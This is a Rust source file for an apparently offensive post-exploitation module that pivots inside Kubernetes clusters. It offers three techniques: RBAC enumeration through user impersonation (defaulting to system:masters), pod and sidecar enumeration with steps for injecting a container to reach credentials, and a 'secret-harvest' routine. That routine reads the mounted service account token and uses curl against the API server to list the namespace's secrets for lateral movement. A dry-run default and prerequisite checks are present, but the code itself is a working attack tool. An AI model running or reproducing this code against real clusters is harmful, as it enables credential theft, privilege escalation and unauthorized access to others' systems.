use std::env;
use std::fs;
use std::path::Path;
use std::process::Command;

#[derive(Debug, Clone)]
pub struct PivotPlan {
    pub technique: &'static str,
    pub category: &'static str,
    pub command: String,
    pub as_user: Option<String>,
    pub target_container: Option<String>,
    pub prerequisites: Vec<Prereq>,
    pub steps: &'static [&'static str],
    pub reference: &'static str,
}

#[derive(Debug, Clone)]
pub struct Prereq {
    pub description: String,
    pub satisfied: bool,
}

#[derive(Debug, Clone)]
pub struct PivotOutcome {
    pub plan: PivotPlan,
    pub executed: bool,
    pub success: bool,
    pub stdout: String,
    pub stderr: String,
    pub notes: Vec<String>,
}

pub fn run(
    technique: &str,
    command: &str,
    as_user: Option<&str>,
    target_container: Option<&str>,
    execute: bool,
) -> Result<PivotOutcome, String> {
    let plan = match technique {
        "k8s-impersonate" => plan_k8s_impersonate(command, as_user),
        "k8s-sidecar" => plan_k8s_sidecar(command, target_container),
        "secret-harvest" => plan_secret_harvest(command),
        other => {
            return Err(format!(
                "unknown technique '{other}' — supported: k8s-impersonate, k8s-sidecar, secret-harvest"
            ));
        }
    };

    if !execute {
        return Ok(PivotOutcome {
            plan,
            executed: false,
            success: false,
            stdout: String::new(),
            stderr: String::new(),
            notes: vec!["dry-run: pass --execute to actually run".to_string()],
        });
    }

    if !plan.prerequisites.iter().all(|p| p.satisfied) {
        let mut notes = vec!["execution refused: prerequisites not satisfied".to_string()];
        for p in &plan.prerequisites {
            if !p.satisfied {
                notes.push(format!("  unmet: {}", p.description));
            }
        }
        return Ok(PivotOutcome {
            plan,
            executed: false,
            success: false,
            stdout: String::new(),
            stderr: String::new(),
            notes,
        });
    }

    let outcome = match technique {
        "k8s-impersonate" => execute_k8s_impersonate(&plan),
        "k8s-sidecar" => execute_k8s_sidecar(&plan),
        "secret-harvest" => execute_secret_harvest(&plan),
        _ => unreachable!("technique already validated"),
    };
    Ok(outcome)
}

fn plan_k8s_impersonate(command: &str, as_user: Option<&str>) -> PivotPlan {
    let kubectl_ok = which("kubectl").is_some();
    let token_present = Path::new("/var/run/secrets/kubernetes.io/serviceaccount/token").exists();
    let api_host = env::var("KUBERNETES_SERVICE_HOST").ok();
    PivotPlan {
        technique: "k8s-impersonate",
        category: "kubernetes",
        command: command.to_string(),
        as_user: as_user.map(str::to_string),
        target_container: None,
        prerequisites: vec![
            Prereq {
                description: "kubectl available".to_string(),
                satisfied: kubectl_ok,
            },
            Prereq {
                description: "service account token mounted".to_string(),
                satisfied: token_present,
            },
            Prereq {
                description: "KUBERNETES_SERVICE_HOST present".to_string(),
                satisfied: api_host.is_some(),
            },
            Prereq {
                description: "--as-user provided".to_string(),
                satisfied: as_user.is_some(),
            },
        ],
        steps: &[
            "1. build a kubectl request with --as=<target user>",
            "2. enumerate the impersonated principal's effective permissions",
            "3. if exec/create rights exist, use them for follow-on action",
        ],
        reference: "https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation",
    }
}

fn execute_k8s_impersonate(plan: &PivotPlan) -> PivotOutcome {
    let as_user = plan.as_user.as_deref().unwrap_or("system:masters");
    let output = Command::new("kubectl")
        .args(["auth", "can-i", "--list", "--as", as_user])
        .output();
    match output {
        Ok(out) => PivotOutcome {
            plan: plan.clone(),
            executed: true,
            success: out.status.success(),
            stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
            notes: vec![format!("queried RBAC as impersonated user {as_user}")],
        },
        Err(err) => failure(plan, &format!("kubectl failed: {err}")),
    }
}

fn plan_k8s_sidecar(command: &str, target_container: Option<&str>) -> PivotPlan {
    let kubectl_ok = which("kubectl").is_some();
    let namespace_present = read_namespace().is_some();
    let hostname_present = read_hostname().is_some();
    PivotPlan {
        technique: "k8s-sidecar",
        category: "kubernetes",
        command: command.to_string(),
        as_user: None,
        target_container: target_container.map(str::to_string),
        prerequisites: vec![
            Prereq {
                description: "kubectl available".to_string(),
                satisfied: kubectl_ok,
            },
            Prereq {
                description: "pod namespace discoverable from service account".to_string(),
                satisfied: namespace_present,
            },
            Prereq {
                description: "pod name discoverable from hostname".to_string(),
                satisfied: hostname_present,
            },
            Prereq {
                description: "--target-container provided".to_string(),
                satisfied: target_container.is_some(),
            },
        ],
        steps: &[
            "1. identify the current pod and target container",
            "2. patch the pod spec or create an ephemeral debug container",
            "3. use shared namespaces/volumes to inspect credentials and tokens",
        ],
        reference: "https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/",
    }
}

fn execute_k8s_sidecar(plan: &PivotPlan) -> PivotOutcome {
    let namespace = read_namespace().unwrap_or_else(|| "default".to_string());
    let pod = read_hostname().unwrap_or_else(|| "unknown-pod".to_string());
    let container = plan
        .target_container
        .as_deref()
        .unwrap_or("target-container");
    let output = Command::new("kubectl")
        .args([
            "-n",
            &namespace,
            "get",
            "pod",
            &pod,
            "-o",
            "jsonpath={.spec.containers[*].name}",
        ])
        .output();
    match output {
        Ok(out) => {
            let mut notes = vec![
                format!("enumerated pod {pod} in namespace {namespace}"),
                format!("target container requested: {container}"),
                "execution stops at enumeration; sidecar injection remains manual by design"
                    .to_string(),
            ];
            if !plan.command.is_empty() && plan.command != "id" {
                notes.push(format!("operator command preserved for manual follow-on: {}", plan.command));
            }
            PivotOutcome {
                plan: plan.clone(),
                executed: true,
                success: out.status.success(),
                stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
                stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
                notes,
            }
        }
        Err(err) => failure(plan, &format!("kubectl failed: {err}")),
    }
}

fn plan_secret_harvest(command: &str) -> PivotPlan {
    let namespace_present = read_namespace().is_some();
    let token_present = Path::new("/var/run/secrets/kubernetes.io/serviceaccount/token").exists();
    let curl_ok = which("curl").is_some();
    PivotPlan {
        technique: "secret-harvest",
        category: "credential_access",
        command: command.to_string(),
        as_user: None,
        target_container: None,
        prerequisites: vec![
            Prereq {
                description: "service account token mounted".to_string(),
                satisfied: token_present,
            },
            Prereq {
                description: "service account namespace known".to_string(),
                satisfied: namespace_present,
            },
            Prereq {
                description: "curl available".to_string(),
                satisfied: curl_ok,
            },
        ],
        steps: &[
            "1. enumerate mounted service account material",
            "2. query the namespace's secrets/pods/configmaps via the API server",
            "3. triage harvested credentials for lateral movement",
        ],
        reference: "https://kubernetes.io/docs/reference/access-authn-authz/service-accounts-admin/",
    }
}

fn execute_secret_harvest(plan: &PivotPlan) -> PivotOutcome {
    let mut notes = Vec::new();
    let Some(token) = fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/token")
        .ok()
        .map(|v| v.trim().to_string())
    else {
        return failure(plan, "service account token unreadable");
    };
    let Some(namespace) = read_namespace() else {
        return failure(plan, "service account namespace unreadable");
    };
    let Some(host) = env::var("KUBERNETES_SERVICE_HOST").ok() else {
        return failure(plan, "KUBERNETES_SERVICE_HOST missing");
    };
    let port = env::var("KUBERNETES_SERVICE_PORT").unwrap_or_else(|_| "443".to_string());
    let url = format!("https://{host}:{port}/api/v1/namespaces/{namespace}/secrets");
    let output = Command::new("curl")
        .args([
            "-ksS",
            "-H",
            &format!("Authorization: Bearer {token}"),
            &url,
        ])
        .output();
    match output {
        Ok(out) => {
            notes.push(format!("listed secrets in namespace {namespace}"));
            if !plan.command.is_empty() && plan.command != "id" {
                notes.push(format!("operator command preserved for manual follow-on: {}", plan.command));
            }
            PivotOutcome {
                plan: plan.clone(),
                executed: true,
                success: out.status.success(),
                stdout: String::from_utf8_lossy(&out.stdout).into_owned(),
                stderr: String::from_utf8_lossy(&out.stderr).into_owned(),
                notes,
            }
        }
        Err(err) => failure(plan, &format!("curl failed: {err}")),
    }
}

fn read_namespace() -> Option<String> {
    fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
        .ok()
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
}

fn read_hostname() -> Option<String> {
    fs::read_to_string("/etc/hostname")
        .ok()
        .map(|v| v.trim().to_string())
        .filter(|v| !v.is_empty())
}

fn which(binary: &str) -> Option<String> {
    let paths = env::var_os("PATH")?;
    for entry in env::split_paths(&paths) {
        let candidate = entry.join(binary);
        if candidate.is_file() {
            return Some(candidate.to_string_lossy().into_owned());
        }
    }
    None
}

fn failure(plan: &PivotPlan, message: &str) -> PivotOutcome {
    PivotOutcome {
        plan: plan.clone(),
        executed: true,
        success: false,
        stdout: String::new(),
        stderr: String::new(),
        notes: vec![message.to_string()],
    }
}
